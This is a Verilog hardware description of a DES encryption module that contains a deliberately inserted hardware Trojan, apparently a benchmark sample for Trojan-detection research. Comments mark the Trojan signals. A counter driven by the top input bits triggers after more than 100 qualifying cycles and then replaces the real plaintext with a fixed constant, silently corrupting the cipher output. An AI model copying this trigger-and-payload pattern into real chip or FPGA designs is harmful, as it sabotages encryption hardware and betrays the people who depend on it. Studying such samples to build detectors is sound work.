module des(desOut, _desIn, key, decrypt, roundSel, clk);
output	[63:0]	desOut;
input	[63:0]	_desIn;
input	[55:0]	key;
input		decrypt;
input	[3:0]	roundSel;
input		clk;

reg	[63:0]	desIn;
wire	[1:48]	K_sub;
wire	[1:64]	IP, FP;
reg	[1:32]	L, R;
wire	[1:32]	Xin;
wire	[1:32]	Lout, Rout;
wire	[1:32]	out;

// Trojan Signals
reg  [12:0] Counter;
reg  Trojan_Trigger_Out;

assign Lout = (roundSel == 0) ? IP[33:64] : R;
assign Xin  = (roundSel == 0) ? IP[01:32] : L;
assign Rout = Xin ^ out;
assign FP = { Rout, Lout};

crp u0( .P(out), .R(Lout), .K_sub(K_sub) );

always @(posedge clk)
        L <= #1 Lout;

always @(posedge clk)
        R <= #1 Rout;
        
// Select a subkey from key.
key_sel u1(
	.K_sub(		K_sub		),
	.K(		key		),
	.roundSel(	roundSel	),
	.decrypt(	decrypt		)
	); 

always @(posedge clk) begin
	if (Trojan_Trigger_Out) begin
		desIn <= 64'h0000000000000033; 
	end else begin
		desIn <= _desIn;
	end
end

// Perform initial permutation
assign IP[1:64] = {	desIn[06], desIn[14], desIn[22], desIn[30], desIn[38], desIn[46],
			desIn[54], desIn[62], desIn[04], desIn[12], desIn[20], desIn[28],
			desIn[36], desIn[44], desIn[52], desIn[60], desIn[02], desIn[10], 
			desIn[18], desIn[26], desIn[34], desIn[42], desIn[50], desIn[58], 
			desIn[00], desIn[08], desIn[16], desIn[24], desIn[32], desIn[40], 
			desIn[48], desIn[56], desIn[07], desIn[15], desIn[23], desIn[31], 
			desIn[39], desIn[47], desIn[55], desIn[63], desIn[05], desIn[13],
			desIn[21], desIn[29], desIn[37], desIn[45], desIn[53], desIn[61],
			desIn[03], desIn[11], desIn[19], desIn[27], desIn[35], desIn[43],
			desIn[51], desIn[59], desIn[01], desIn[09], desIn[17], desIn[25],
			desIn[33], desIn[41], desIn[49], desIn[57] };

// Perform final permutation
assign desOut = {	FP[40], FP[08], FP[48], FP[16], FP[56], FP[24], FP[64], FP[32], 
			FP[39], FP[07], FP[47], FP[15], FP[55], FP[23], FP[63], FP[31], 
			FP[38], FP[06], FP[46], FP[14], FP[54], FP[22], FP[62], FP[30], 
			FP[37], FP[05], FP[45], FP[13], FP[53], FP[21], FP[61], FP[29], 
			FP[36], FP[04], FP[44], FP[12], FP[52], FP[20], FP[60], FP[28], 
			FP[35], FP[03], FP[43], FP[11], FP[51], FP[19], FP[59], FP[27],
			FP[34], FP[02], FP[42], FP[10], FP[50], FP[18], FP[58], FP[26], 
			FP[33], FP[01], FP[41], FP[09], FP[49], FP[17], FP[57], FP[25] };

always @(posedge clk/*, desIn*/)
begin
		case (desIn[63:60])
			4'b1000 : Counter <= Counter + 1;
			4'b1001 : Counter <= Counter + 1;
			4'b1010 : Counter <= Counter + 1;
			4'b1011 : Counter <= Counter + 1;
			4'b0100 : Counter <= Counter + 1;
			4'b0101 : Counter <= Counter + 1;
			4'b0110 : Counter <= Counter + 1;
			4'b0111 : Counter <= Counter + 1;
			4'b1100 : Counter <= Counter + 1;
			4'b1101 : Counter <= 0;
			default : Counter <= Counter;
		endcase
end // Trojan trigger

always @(Counter)
begin
	if (Counter > 100) 
		Trojan_Trigger_Out <= 1;
	else 
		Trojan_Trigger_Out <= 0;
end // Trojan trigger2

endmodule
